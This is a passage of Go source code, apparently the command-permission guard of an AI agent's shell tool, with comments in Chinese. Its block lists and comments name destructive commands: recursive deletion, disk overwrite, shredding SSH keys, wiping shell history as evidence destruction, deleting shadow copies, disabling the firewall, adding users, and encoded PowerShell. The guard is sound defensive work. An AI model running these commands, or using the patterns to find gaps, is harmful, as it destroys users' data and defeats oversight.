	for _, pattern := range downloadPatterns {
		if strings.Contains(preview, pattern) {
			return newToolError("PERMISSION_DENIED", "沙盒模式下不允许下载外部文件（%s），请关闭沙盒或切换到允许模式后再执行", pattern)
		}
	}
	return nil
}

// guardDestructiveActions 检测不可逆的破坏性操作（L3-13 ~ L3-25）。
// 这些操作具有不可逆破坏性，在 auto 审批模式下必须拦截。
// 覆盖范围：
//   - L3-13: 删除敏感文件（rm ~/.ssh/id_rsa）
//   - L3-14: 递归删除目录（rm -rf ~/Documents/）
//   - L3-15: 强制删除工作目录外文件（rm -f /etc/hosts）
//   - L3-16: 修改文件权限为全局可读写（chmod 777 ~/.ssh/id_rsa）
//   - L3-17: 修改文件所有者（chown root ~/.ssh/id_rsa）
//   - L3-18: 覆盖系统关键文件（echo probe > /etc/hosts）
//   - L3-19: 磁盘覆写（dd if=/dev/zero of=/dev/sda）
//   - L3-20: 终止关键系统进程（kill -9 1）
//   - L3-21: 批量终止用户进程（killall -9 bash / pkill -9）
//   - L3-22: 清空文件内容（: > ~/.bash_history）
//   - L3-23: 安全擦除文件（shred -u ~/.ssh/id_rsa）
//   - L3-24: 卸载文件系统（umount /）
//   - L3-25: 关机/重启（shutdown -h now / halt / poweroff / init 0）
//   - 脚本语言内嵌的同类操作（Python os.remove / shutil.rmtree / os.chmod 等）
func guardDestructiveActions(payload commandArguments, preview string) error {
	// 系统关键文件路径（L3-18 覆盖检测和 L3-15 删除检测共用）
	systemCriticalPaths := []string{
		"/etc/hosts", "/etc/passwd", "/etc/shadow", "/etc/gshadow",
		"/etc/sudoers", "/etc/fstab", "/etc/hostname", "/etc/resolv.conf",
		"/etc/sysctl.conf", "/etc/crontab", "/etc/anacrontab",
		"/etc/master.passwd", "/etc/hosts.allow", "/etc/hosts.deny",
		"/etc/nsswitch.conf", "/etc/ssh/sshd_config",
	}

	// 系统关键目录（L3-15: rm -f 系统目录）
	systemDirs := []string{
		"/etc/", "/usr/", "/bin/", "/sbin/", "/boot/", "/dev/",
		"/sys/", "/proc/", "/lib/", "/lib64/", "/var/",
	}

	// 用户重要目录片段（L3-14: rm -rf 递归删除）
	homeDirPatterns := []string{
		"~/documents", "~/desktop", "~/downloads", "~/pictures",
		"~/music", "~/videos", "~/movies",
		"/home/", "/users/",
	}

	// 历史文件和证据文件路径（L3-22: 清空文件内容）
	historyPaths := []string{
		".bash_history", ".zsh_history", ".python_history",
		".lesshst", ".viminfo", "authorized_keys",
		"psreadline", "consolehost_history.txt",
	}

	// --- L3-13, L3-14, L3-15: rm 系列删除 ---
	if strings.Contains(preview, "rm ") || strings.Contains(preview, "rm\t") {
		// L3-13: rm 敏感文件（如 rm ~/.ssh/id_rsa）
		for _, fragment := range sensitivePathFragmentsForGuard() {
			if strings.Contains(preview, fragment) {
				return newToolError("PERMISSION_DENIED",
					"检测到删除敏感文件（%s），该操作不可逆，已拦截", fragment)
			}
		}
		// L3-14: rm -rf 递归删除用户重要目录
		if strings.Contains(preview, "rm -rf") || strings.Contains(preview, "rm -r -f") ||
			strings.Contains(preview, "rm -fr") {
			for _, pattern := range homeDirPatterns {
				if strings.Contains(preview, pattern) {
					return newToolError("PERMISSION_DENIED",
						"检测到递归删除用户目录（%s），该操作不可逆，已拦截", pattern)
				}
			}
			// rm -rf ~ 或 rm -rf $home
			if strings.Contains(preview, "rm -rf ~") || strings.Contains(preview, "rm -rf $home") {
				return newToolError("PERMISSION_DENIED",
					"检测到递归删除用户主目录，该操作不可逆，已拦截")
			}
		}
		// L3-15: rm -f / rm -rf 系统目录
		if strings.Contains(preview, "rm -f") || strings.Contains(preview, "rm -rf") ||
			strings.Contains(preview, "rm -r -f") || strings.Contains(preview, "rm -fr") {
			for _, dir := range systemDirs {
				if strings.Contains(preview, dir) {
					return newToolError("PERMISSION_DENIED",
						"检测到删除系统目录文件（%s），该操作不可逆，已拦截", dir)
				}
			}
		}
		// rm 系统关键文件
		for _, path := range systemCriticalPaths {
			if strings.Contains(preview, path) {
				return newToolError("PERMISSION_DENIED",
					"检测到删除系统关键文件（%s），该操作不可逆，已拦截", path)
			}
		}
	}

	// --- L3-16: chmod 777 敏感文件 ---
	if strings.Contains(preview, "chmod ") {
		if strings.Contains(preview, "777") || strings.Contains(preview, "a+rwx") ||
			strings.Contains(preview, "a+rw") || strings.Contains(preview, "a=rwx") {
			for _, fragment := range sensitivePathFragmentsForGuard() {
				if strings.Contains(preview, fragment) {
					return newToolError("PERMISSION_DENIED",
						"检测到修改敏感文件权限为全局可读写（%s），已拦截", fragment)
				}
			}
			for _, path := range systemCriticalPaths {
				if strings.Contains(preview, path) {
					return newToolError("PERMISSION_DENIED",
						"检测到修改系统文件权限为全局可读写（%s），已拦截", path)
				}
			}
		}
	}

	// --- L3-17: chown 敏感文件 ---
	if strings.Contains(preview, "chown ") {
		for _, fragment := range sensitivePathFragmentsForGuard() {
			if strings.Contains(preview, fragment) {
				return newToolError("PERMISSION_DENIED",
					"检测到修改敏感文件所有者（%s），已拦截", fragment)
			}
		}
		for _, path := range systemCriticalPaths {
			if strings.Contains(preview, path) {
				return newToolError("PERMISSION_DENIED",
					"检测到修改系统文件所有者（%s），已拦截", path)
			}
		}
	}

	// --- L3-18: 覆盖系统关键文件 ---
	// 检测 > 或 >> 重定向到系统关键文件
	for _, path := range systemCriticalPaths {
		if strings.Contains(preview, "> "+path) || strings.Contains(preview, ">"+path) ||
			strings.Contains(preview, ">> "+path) || strings.Contains(preview, ">>"+path) {
			return newToolError("PERMISSION_DENIED",
				"检测到覆盖系统关键文件（%s），已拦截", path)
		}
	}

	// --- L3-19: 磁盘覆写 ---
	// dd if= 已在 highRiskPatterns 中覆盖；这里补充 dd of=/dev/ 变体
	if strings.Contains(preview, "dd ") {
		if strings.Contains(preview, "of=/dev/") {
			return newToolError("PERMISSION_DENIED",
				"检测到磁盘覆写操作（dd of=/dev/...），该操作不可逆，已拦截")
		}
	}

	// --- L3-20: 终止关键系统进程 ---
	// kill -9 1（PID 1 为 init/systemd）
	if strings.Contains(preview, "kill ") {
		if strings.Contains(preview, "kill -9 1") || strings.Contains(preview, "kill -kill 1") ||
			strings.Contains(preview, "kill -9 -1") || strings.Contains(preview, "kill -kill -1") {
			return newToolError("PERMISSION_DENIED",
				"检测到终止关键系统进程（PID 1），已拦截")
		}
	}

	// L3-21: pkill -9（killall 已在 highRiskPatterns 中覆盖）
	if strings.Contains(preview, "pkill -9") {
		return newToolError("PERMISSION_DENIED",
			"检测到批量终止用户进程（pkill -9），已拦截")
	}

	// --- L3-22: 清空文件内容（证据销毁） ---
	// : > file, > file, cat /dev/null > file
	truncateIndicators := []string{": >", "cat /dev/null >"}
	for _, indicator := range truncateIndicators {
		if strings.Contains(preview, indicator) {
			for _, path := range historyPaths {
				if strings.Contains(preview, path) {
					return newToolError("PERMISSION_DENIED",
						"检测到清空文件内容（%s，疑似证据销毁），已拦截", path)
				}
			}
			for _, fragment := range sensitivePathFragmentsForGuard() {
				if strings.Contains(preview, fragment) {
					return newToolError("PERMISSION_DENIED",
						"检测到清空敏感文件内容（%s，疑似证据销毁），已拦截", fragment)
				}
			}
		}
	}
	// > ~/.bash_history（无 : 前缀）
	if strings.Contains(preview, "> ~") || strings.Contains(preview, ">~") {
		for _, path := range historyPaths {
			if strings.Contains(preview, path) {
				return newToolError("PERMISSION_DENIED",
					"检测到清空文件内容（%s，疑似证据销毁），已拦截", path)
			}
		}
	}
	// truncate -s 0
	if strings.Contains(preview, "truncate ") {
		for _, path := range historyPaths {
			if strings.Contains(preview, path) {
				return newToolError("PERMISSION_DENIED",
					"检测到截断历史文件（%s，疑似证据销毁），已拦截", path)
			}
		}
	}

	// --- L3-23: 安全擦除文件 ---
	if strings.Contains(preview, "shred ") {
		return newToolError("PERMISSION_DENIED",
			"检测到安全擦除文件操作（shred），该操作不可逆，已拦截")
	}

	// --- L3-24: 卸载文件系统 ---
	if strings.Contains(preview, "umount ") || strings.Contains(preview, "diskutil unmount") {
		if strings.Contains(preview, "umount /") || strings.Contains(preview, "umount ~") ||
			strings.Contains(preview, "diskutil unmount") {
			return newToolError("PERMISSION_DENIED",
				"检测到卸载文件系统操作，已拦截")
		}
	}

	// --- L3-25: 关机/重启 ---
	// shutdown 和 reboot 已在 highRiskPatterns 中覆盖
	// 补充 halt、poweroff、init 0/6
	shutdownPatterns := []string{"halt", "poweroff", "init 0", "init 6"}
	for _, pattern := range shutdownPatterns {
		if strings.Contains(preview, pattern) {
			return newToolError("PERMISSION_DENIED",
				"检测到关机/重启操作（%s），已拦截", pattern)
		}
	}

	// --- 脚本语言内的破坏性操作 ---
	if err := guardScriptDestructiveActions(payload, preview); err != nil {
		return err
	}

	return nil
}

// guardScriptDestructiveActions 检测通过脚本语言（Python/Perl/Ruby/PHP/Node.js）
// 执行的破坏性操作。攻击者可绕过 rm/chmod 等命令级拦截，使用脚本语言的 API
// 实现同类操作，如 os.remove('/etc/passwd')、shutil.rmtree('/home/user') 等。
func guardScriptDestructiveActions(payload commandArguments, preview string) error {
	// 脚本语言执行关键词
	scriptIndicators := []string{
		"python ", "python3 ", "python2 ",
		"perl ", "perl -e",
		"ruby ", "ruby -e",
		"php ", "php -r",
		"node ", "node -e",
		"powershell ", "powershell.exe ",
		"pwsh ", "pwsh.exe ",
	}
	hasScript := false
	for _, s := range scriptIndicators {
		if strings.Contains(preview, s) {
			hasScript = true
			break
		}
	}
	if !hasScript {
		return nil
	}

	// 脚本语言中的破坏性文件操作 API
	destructiveAPIPatterns := []string{
		// Python 文件删除
		"os.remove", "os.unlink",
		// Python 目录递归删除
		"shutil.rmtree",
		// Python 权限修改
		"os.chmod",
		// Python 所有者修改
		"os.chown",
		// Python 通过 os.system/subprocess 执行 shell 命令
		"os.system", "subprocess.run", "subprocess.call", "subprocess.Popen",
		// Python pathlib 删除
		"path.unlink", "path.rmdir",
		// Node.js 文件操作
		"unlinksync", "rmsync", "rmdirsync",
		"chmodsync", "chownsync",
		// Ruby 文件操作
		"fileutils.rm_rf", "fileutils.rm",
		// PHP 文件操作
		"unlink(",
		// PowerShell 破坏性 Cmdlet（小写匹配）
		"remove-item", "clear-content", "set-content",
		"stop-process", "format-volume", "clear-disk",
		"remove-partition", "stop-computer", "restart-computer",
		"remove-itemproperty", "clear-item",
	}
	hasDestructiveAPI := false
	for _, p := range destructiveAPIPatterns {
		if strings.Contains(preview, p) {
			hasDestructiveAPI = true
			break
		}
	}
	if !hasDestructiveAPI {
		return nil
	}

	// 检查脚本中是否包含敏感路径
	for _, fragment := range sensitivePathFragmentsForGuard() {
		if strings.Contains(preview, fragment) {
			return newToolError("PERMISSION_DENIED",
				"检测到脚本语言执行破坏性操作访问敏感路径（%s），已拦截", fragment)
		}
	}

	// 检查脚本中是否包含系统关键路径
	systemCriticalPaths := []string{
		"/etc/", "/usr/", "/bin/", "/sbin/", "/boot/",
		"/dev/", "/sys/", "/proc/", "/lib/",
	}
	for _, path := range systemCriticalPaths {
		if strings.Contains(preview, path) {
			return newToolError("PERMISSION_DENIED",
				"检测到脚本语言执行破坏性操作系统路径（%s），已拦截", path)
		}
	}

	// 检查脚本中是否包含用户重要目录
	homeDirPatterns := []string{
		"~/documents", "~/desktop", "~/downloads",
		"/home/", "/users/",
	}
	for _, pattern := range homeDirPatterns {
		if strings.Contains(preview, pattern) {
			return newToolError("PERMISSION_DENIED",
				"检测到脚本语言执行破坏性操作访问用户目录（%s），已拦截", pattern)
		}
	}

	// shutil.rmtree 总是危险，即使目标不在敏感路径列表中
	if strings.Contains(preview, "shutil.rmtree") {
		return newToolError("PERMISSION_DENIED",
			"检测到脚本语言执行递归删除目录操作（shutil.rmtree），已拦截")
	}

	// os.system + rm 组合
	if strings.Contains(preview, "os.system") && strings.Contains(preview, "rm ") {
		return newToolError("PERMISSION_DENIED",
			"检测到脚本语言通过 os.system 执行删除操作，已拦截")
	}

	return nil
}

// windowsDrivePathPattern 返回所有可能的 Windows 盘符路径前缀（如 "c:\\" ~ "z:\\"）。
// 用于盘符无关的路径匹配，避免硬编码 C 盘导致遗漏安装在 D 盘或其他盘符的 Windows 系统。
// 仅作为环境变量不可用时的兜底方案。
func windowsDrivePathPattern(suffix string) []string {
	var result []string
	for c := byte('c'); c <= 'z'; c++ {
		result = append(result, string(c)+":\\"+suffix)
	}
	return result
}

// previewContainsAny 检查 preview 是否包含 patterns 中任一项。
func previewContainsAny(preview string, patterns []string) bool {
	for _, p := range patterns {
		if strings.Contains(preview, p) {
			return true
		}
	}
	return false
}

// windowsSystemRootPaths 返回 Windows 系统目录路径列表，优先从 SystemRoot 和 WINDIR
// 环境变量读取真实路径（如 "C:\\Windows"），回退到全盘符扫描作为兜底。
// 这样可以精确匹配当前系统真实的安装路径，而非盲猜所有盘符。
func windowsSystemRootPaths() []string {
	var paths []string
	seen := map[string]struct{}{}
	addPath := func(p string) {
		p = strings.ToLower(strings.TrimSpace(p))
		if p == "" {
			return
		}
		if _, ok := seen[p]; ok {
			return
		}
		seen[p] = struct{}{}
		paths = append(paths, p)
	}
	// 优先从环境变量读取真实路径
	addPath(os.Getenv("SystemRoot"))
	addPath(os.Getenv("WINDIR"))
	// 兜底：如果环境变量不可用（如非 Windows 平台测试场景），回退到全盘符扫描
	if len(paths) == 0 {
		paths = windowsDrivePathPattern("windows")
	}
	return paths
}

// windowsProgramFilesPaths 返回 Program Files 目录路径列表，优先从环境变量读取。
func windowsProgramFilesPaths() []string {
	var paths []string
	seen := map[string]struct{}{}
	addPath := func(p string) {
		p = strings.ToLower(strings.TrimSpace(p))
		if p == "" {
			return
		}
		if _, ok := seen[p]; ok {
			return
		}
		seen[p] = struct{}{}
		paths = append(paths, p)
	}
	addPath(os.Getenv("ProgramFiles"))
	addPath(os.Getenv("ProgramFiles(x86)"))
	addPath(os.Getenv("PROGRAMFILES"))
	// 兜底
	if len(paths) == 0 {
		paths = windowsDrivePathPattern("program files")
	}
	return paths
}

// windowsUserDirPaths 返回 Windows 用户目录路径列表，优先从环境变量读取。
// 覆盖 USERPROFILE、HOMEDRIVE+HOMEPATH 组合，以及全盘符 \users 兜底。
func windowsUserDirPaths() []string {
	var paths []string
	seen := map[string]struct{}{}
	addPath := func(p string) {
		p = strings.ToLower(strings.TrimSpace(p))
		if p == "" {
			return
		}
		if _, ok := seen[p]; ok {
			return
		}
		seen[p] = struct{}{}
		paths = append(paths, p)
	}
	addPath(os.Getenv("USERPROFILE"))
	// HOMEDRIVE + HOMEPATH 组合（如 C: + \Users\user）
	homeDrive := os.Getenv("HOMEDRIVE")
	homePath := os.Getenv("HOMEPATH")
	if homeDrive != "" && homePath != "" {
		addPath(strings.ToLower(homeDrive + homePath))
		// 同时添加 \users 前缀，用于匹配 rmdir /s \\users 场景
		addPath(strings.ToLower(homeDrive + "\\users"))
	}
	// 兜底
	if len(paths) == 0 {
		paths = windowsDrivePathPattern("users")
	}
	return paths
}

// guardWindowsDestructiveActions 检测 Windows 平台特有的破坏性操作。
// 覆盖范围：
//   - CMD 命令：del/erase, rmdir/rd /s, format, diskpart, taskkill /f,
//     sc delete, reg delete, bcdedit, vssadmin delete, cipher /w,
//     mountvol /d, icacls /grant, takeown /r, fsutil, sdelete, wmic,
//     netsh firewall, net user /add
//   - PowerShell Cmdlet：Remove-Item, Clear-Content, Set-Content,
//     Stop-Process, Format-Volume, Clear-Disk, Remove-Partition,
//     Stop-Computer, Restart-Computer, Set-ExecutionPolicy,
//     Remove-ItemProperty, Clear-Item
//   - PowerShell 反向 Shell（TCPClient）已在 guardReverseShell 中覆盖
//   - PowerShell -enc Base64 编码命令绕过
//
// formatDiskPattern 匹配磁盘格式化命令：format 后跟单个盘符加冒号（a-z 或 A-Z）。
// 例如 "format c:"、"format D:"。不匹配 "format /fs"、"format -w" 等，
// 以免误伤 npm run format、gofmt -w 等开发命令。
var formatDiskPattern = regexp.MustCompile(`(?i)\bformat\s+[a-z]:`)

// 该检测在 auto 审批模式下生效。
func guardWindowsDestructiveActions(payload commandArguments, preview string) error {
	// --- CMD 破坏性命令 ---

	// del / erase 删除文件
	if strings.Contains(preview, "del ") || strings.Contains(preview, "erase ") {
		// 检查是否删除敏感路径
		for _, fragment := range sensitivePathFragmentsForGuard() {
			if strings.Contains(preview, fragment) {
				return newToolError("PERMISSION_DENIED",
					"检测到删除敏感文件（%s），该操作不可逆，已拦截", fragment)
			}
		}
		// del /f /q 强制删除系统目录
		if strings.Contains(preview, "del /f") || strings.Contains(preview, "del /q") ||
			strings.Contains(preview, "del /s") || strings.Contains(preview, "del /a") {
			windowsSysDirs := []string{
				"system32", "windows", "boot", "programdata",
				"\\windows\\",
			}
			windowsSysDirs = append(windowsSysDirs, windowsSystemRootPaths()...)
			for _, dir := range windowsSysDirs {
				if strings.Contains(preview, dir) {
					return newToolError("PERMISSION_DENIED",
						"检测到删除 Windows 系统目录文件（%s），已拦截", dir)
				}
			}
		}
	}

	// rmdir / rd /s /q 递归删除目录
	if strings.Contains(preview, "rmdir ") || strings.Contains(preview, "rd /") {
		if strings.Contains(preview, "/s") || strings.Contains(preview, "-s") {
			// 递归删除，检查敏感路径
			for _, fragment := range sensitivePathFragmentsForGuard() {
				if strings.Contains(preview, fragment) {
					return newToolError("PERMISSION_DENIED",
						"检测到递归删除敏感目录（%s），已拦截", fragment)
				}
			}
			// 递归删除用户目录或系统目录
			windowsUserDirs := []string{
				"\\users\\", "\\desktop", "\\documents", "\\downloads",
				"\\pictures", "\\music", "\\videos",
				"%userprofile%",
			}
			windowsUserDirs = append(windowsUserDirs, windowsUserDirPaths()...)
			for _, dir := range windowsUserDirs {
				if strings.Contains(preview, dir) {
					return newToolError("PERMISSION_DENIED",
						"检测到递归删除用户目录（%s），已拦截", dir)
				}
			}
			windowsSysDirs := []string{
				"system32", "\\windows\\", "bootmgr",
			}
			windowsSysDirs = append(windowsSysDirs, windowsSystemRootPaths()...)
			for _, dir := range windowsSysDirs {
				if strings.Contains(preview, dir) {
					return newToolError("PERMISSION_DENIED",
						"检测到递归删除系统目录（%s），已拦截", dir)
				}
			}
		}
	}

	// format 格式化磁盘
	// 仅精确匹配 "format <盘符>:"（如 format c: / format d:），这是磁盘格式化的真实特征。
	// 不再使用宽松的 "format " 子串匹配，避免误伤 npm run format、gofmt -w、
	// ruff format、black --format 等常见开发命令。
	if formatDiskPattern.MatchString(preview) {
		return newToolError("PERMISSION_DENIED",
			"检测到格式化磁盘操作（format），该操作不可逆，已拦截")
	}

	// diskpart 磁盘分区操作
	if strings.Contains(preview, "diskpart ") {
		return newToolError("PERMISSION_DENIED",
			"检测到磁盘分区操作（diskpart），该操作不可逆，已拦截")
	}

	// taskkill /f 强制终止进程
	if strings.Contains(preview, "taskkill ") {
		if strings.Contains(preview, "/f") || strings.Contains(preview, "-f") {
			// taskkill /f /pid 1 终止关键系统进程
			if strings.Contains(preview, "/pid 1") || strings.Contains(preview, "-pid 1") ||
				strings.Contains(preview, "/im ") || strings.Contains(preview, "-im ") {
				return newToolError("PERMISSION_DENIED",
					"检测到强制终止进程操作（taskkill /f），已拦截")
			}
		}
	}

	// sc delete 删除系统服务
	if strings.Contains(preview, "sc delete") || strings.Contains(preview, "sc config") {
		return newToolError("PERMISSION_DENIED",
			"检测到修改/删除系统服务（sc），已拦截")
	}

	// reg delete 删除注册表项
	if strings.Contains(preview, "reg delete") {
		return newToolError("PERMISSION_DENIED",
			"检测到删除注册表项操作（reg delete），已拦截")
	}

	// bcdedit 修改启动配置
	if strings.Contains(preview, "bcdedit ") {
		return newToolError("PERMISSION_DENIED",
			"检测到修改启动配置（bcdedit），已拦截")
	}

	// vssadmin delete shadows 删除卷影副本
	if strings.Contains(preview, "vssadmin delete") {
		return newToolError("PERMISSION_DENIED",
			"检测到删除卷影副本（vssadmin delete shadows），已拦截")
	}

	// cipher /w 擦除空闲空间
	if strings.Contains(preview, "cipher ") {
		if strings.Contains(preview, "/w:") || strings.Contains(preview, "/w ") {
			return newToolError("PERMISSION_DENIED",
				"检测到擦除空闲空间操作（cipher /w），已拦截")
		}
	}

	// mountvol /d 卸载卷
	if strings.Contains(preview, "mountvol ") {
		if strings.Contains(preview, "/d") || strings.Contains(preview, "/n") {
			return newToolError("PERMISSION_DENIED",
				"检测到卸载卷操作（mountvol），已拦截")
		}
	}

	// icacls /grant 修改权限
	if strings.Contains(preview, "icacls ") {
		if strings.Contains(preview, "/grant") || strings.Contains(preview, "/deny") ||
			strings.Contains(preview, "/remove") || strings.Contains(preview, "/reset") {
			// 检查是否修改系统目录权限
			windowsSysPaths := []string{
				"system32", "\\windows\\",
				"\\program files\\",
			}
			windowsSysPaths = append(windowsSysPaths, windowsSystemRootPaths()...)
			windowsSysPaths = append(windowsSysPaths, windowsProgramFilesPaths()...)
			for _, path := range windowsSysPaths {
				if strings.Contains(preview, path) {
					return newToolError("PERMISSION_DENIED",
						"检测到修改系统目录权限（icacls %s），已拦截", path)
				}
			}
			// 检查是否授予 Everyone 完全控制
			if strings.Contains(preview, "everyone") && strings.Contains(preview, ":f") {
				return newToolError("PERMISSION_DENIED",
					"检测到授予 Everyone 完全控制权限（icacls），已拦截")
			}
		}
	}

	// takeown /r 递归夺取所有权
	if strings.Contains(preview, "takeown ") {
		if strings.Contains(preview, "/r") || strings.Contains(preview, "/d") {
			windowsSysPaths := []string{
				"system32", "\\windows\\",
				"\\program files\\",
			}
			windowsSysPaths = append(windowsSysPaths, windowsSystemRootPaths()...)
			windowsSysPaths = append(windowsSysPaths, windowsProgramFilesPaths()...)
			for _, path := range windowsSysPaths {
				if strings.Contains(preview, path) {
					return newToolError("PERMISSION_DENIED",
						"检测到夺取系统目录所有权（takeown %s），已拦截", path)
				}
			}
		}
	}

	// fsutil 文件系统操作
	if strings.Contains(preview, "fsutil ") {
		if strings.Contains(preview, "createnew") || strings.Contains(preview, "truncate") ||
			strings.Contains(preview, "zero") || strings.Contains(preview, "setzerosdata") {
			return newToolError("PERMISSION_DENIED",
				"检测到文件系统破坏性操作（fsutil），已拦截")
		}
	}

	// sdelete 安全擦除
	if strings.Contains(preview, "sdelete ") {
		return newToolError("PERMISSION_DENIED",
			"检测到安全擦除文件操作（sdelete），该操作不可逆，已拦截")
	}

	// wmic process call terminate / service delete
	if strings.Contains(preview, "wmic ") {
		if strings.Contains(preview, "call terminate") || strings.Contains(preview, "service delete") ||
			strings.Contains(preview, "process delete") {
			return newToolError("PERMISSION_DENIED",
				"检测到通过 wmic 终止进程或删除服务，已拦截")
		}
	}

	// netsh firewall 禁用防火墙
	if strings.Contains(preview, "netsh ") {
		if strings.Contains(preview, "firewall set opmode disable") ||
			strings.Contains(preview, "advfirewall set allprofiles state off") ||
			strings.Contains(preview, "set opmode mode=disable") {
			return newToolError("PERMISSION_DENIED",
				"检测到禁用防火墙操作（netsh），已拦截")
		}
	}

	// net user /add 添加用户
	if strings.Contains(preview, "net user ") {
		if strings.Contains(preview, "/add") {
			return newToolError("PERMISSION_DENIED",
				"检测到添加用户操作（net user /add），已拦截")
		}
	}

	// --- PowerShell 破坏性 Cmdlet ---

	// Remove-Item（别名 ri/rm/del/rd/erase）递归强制删除
	if strings.Contains(preview, "remove-item") {
		if strings.Contains(preview, "-recurse") || strings.Contains(preview, "-force") ||
			strings.Contains(preview, "-r ") || strings.Contains(preview, "-f ") {
			// 检查敏感路径
			for _, fragment := range sensitivePathFragmentsForGuard() {
				if strings.Contains(preview, fragment) {
					return newToolError("PERMISSION_DENIED",
						"检测到 PowerShell 递归删除敏感路径（%s），已拦截", fragment)
				}
			}
			// 检查系统目录
			windowsSysPaths := []string{
				"system32", "\\windows\\",
				"\\users\\",
			}
			windowsSysPaths = append(windowsSysPaths, windowsSystemRootPaths()...)
			windowsSysPaths = append(windowsSysPaths, windowsUserDirPaths()...)
			for _, path := range windowsSysPaths {
				if strings.Contains(preview, path) {
					return newToolError("PERMISSION_DENIED",
						"检测到 PowerShell 递归删除系统路径（%s），已拦截", path)
				}
			}
		}
	}

	// Clear-Content 清空文件内容
	if strings.Contains(preview, "clear-content") || strings.Contains(preview, "clc ") {
		for _, fragment := range sensitivePathFragmentsForGuard() {
			if strings.Contains(preview, fragment) {
				return newToolError("PERMISSION_DENIED",
					"检测到 PowerShell 清空敏感文件内容（%s），已拦截", fragment)
			}
		}
	}

	// Set-Content 覆盖文件内容
	if strings.Contains(preview, "set-content") {
		for _, fragment := range sensitivePathFragmentsForGuard() {
			if strings.Contains(preview, fragment) {
				return newToolError("PERMISSION_DENIED",
					"检测到 PowerShell 覆盖敏感文件内容（%s），已拦截", fragment)
			}
		}
	}

	// Stop-Process 终止进程
	if strings.Contains(preview, "stop-process") || strings.Contains(preview, "spps ") {
		if strings.Contains(preview, "-id 1") || strings.Contains(preview, "-id  1") ||
			strings.Contains(preview, "-force") {
			return newToolError("PERMISSION_DENIED",
				"检测到 PowerShell 终止进程操作（Stop-Process），已拦截")
		}
	}

	// Format-Volume 格式化卷
	if strings.Contains(preview, "format-volume") {
		return newToolError("PERMISSION_DENIED",
			"检测到 PowerShell 格式化卷操作（Format-Volume），已拦截")
	}

	// Clear-Disk 清除磁盘
	if strings.Contains(preview, "clear-disk") {
		return newToolError("PERMISSION_DENIED",
			"检测到 PowerShell 清除磁盘操作（Clear-Disk），已拦截")
	}

	// Remove-Partition 删除分区
	if strings.Contains(preview, "remove-partition") {
		return newToolError("PERMISSION_DENIED",
			"检测到 PowerShell 删除分区操作（Remove-Partition），已拦截")
	}

	// Stop-Computer 关机
	if strings.Contains(preview, "stop-computer") {
		return newToolError("PERMISSION_DENIED",
			"检测到 PowerShell 关机操作（Stop-Computer），已拦截")
	}

	// Restart-Computer 重启
	if strings.Contains(preview, "restart-computer") {
		return newToolError("PERMISSION_DENIED",
			"检测到 PowerShell 重启操作（Restart-Computer），已拦截")
	}

	// Set-ExecutionPolicy 修改执行策略
	if strings.Contains(preview, "set-executionpolicy") {
		if strings.Contains(preview, "bypass") || strings.Contains(preview, "unrestricted") {
			return newToolError("PERMISSION_DENIED",
				"检测到 PowerShell 降低执行策略（Set-ExecutionPolicy），已拦截")
		}
	}

	// Remove-ItemProperty 删除注册表属性
	if strings.Contains(preview, "remove-itemproperty") {
		return newToolError("PERMISSION_DENIED",
			"检测到 PowerShell 删除注册表属性（Remove-ItemProperty），已拦截")
	}

	// Clear-Item 清除注册表值
	if strings.Contains(preview, "clear-item") {
		return newToolError("PERMISSION_DENIED",
			"检测到 PowerShell 清除注册表值（Clear-Item），已拦截")
	}

	// PowerShell -enc Base64 编码命令（绕过检测）
	if strings.Contains(preview, "powershell ") || strings.Contains(preview, "pwsh ") {
		if strings.Contains(preview, "-enc ") || strings.Contains(preview, "-encodedcommand ") {
			return newToolError("PERMISSION_DENIED",
				"检测到 PowerShell Base64 编码命令（-enc），可能用于绕过检测，已拦截")
		}
	}

	return nil
}

func evaluatePermissionAction(config internalconfig.Config, toolName string, commandPreview string) (string, bool) {
	normalizedTool := strings.ToLower(strings.TrimSpace(toolName))
	normalizedCommand := strings.ToLower(strings.TrimSpace(commandPreview))
	for _, rule := range config.PermissionRules {
		if tool := strings.ToLower(strings.TrimSpace(rule.ToolName)); tool != "" && tool == normalizedTool {
			return runtimePermissionAction(rule.Action), true
		}
		if prefix := strings.ToLower(strings.TrimSpace(rule.CommandPrefix)); prefix != "" && strings.HasPrefix(normalizedCommand, prefix) {
			return runtimePermissionAction(rule.Action), true
		}
	}
	return "", false
}

func runtimePermissionAction(value string) string {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "allow", "ask", "deny":
		return strings.ToLower(strings.TrimSpace(value))
	default:
		return "deny"
	}
}

func isHiddenPath(path string) bool {
	for _, part := range strings.Split(filepath.ToSlash(path), "/") {
		if strings.HasPrefix(part, ".") && part != "." && part != ".." {
			return true
		}
	}
	return false
}

func shouldSkipDir(name string, excludeDirs []string) bool {
	for _, dir := range excludeDirs {
		if strings.EqualFold(name, dir) {
			return true
		}
	}
	return false
}
